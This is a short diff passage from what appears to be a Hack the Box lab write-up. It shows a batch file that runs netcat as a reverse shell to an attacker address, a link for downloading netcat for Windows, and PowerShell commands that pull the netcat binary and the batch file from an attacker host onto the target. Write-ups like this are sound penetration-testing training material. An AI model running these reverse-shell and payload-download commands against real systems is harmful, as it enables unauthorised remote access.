@@ -324,3 +324,11 @@ Contents of `shell.bat`
 @echo off
 \programdata\nc.exe 10.10.14.14 443 -e cmd
 ```
+Get netcat for windows from `https://github.com/int0x33/nc.exe/raw/master/nc64.exe`.
+Upload to target
+```CSS
+powershell wget http://10.10.14.4/nc64.exe -outfile nc.exe
+powershell wget http://10.10.14.4/shell.bat -outfile shell.bat
+```
+![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/1893a69b-a164-445c-8f62-983c8a3a76b0)
+![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/0be0eb33-940a-4fb2-88c0-9f47b2832825)
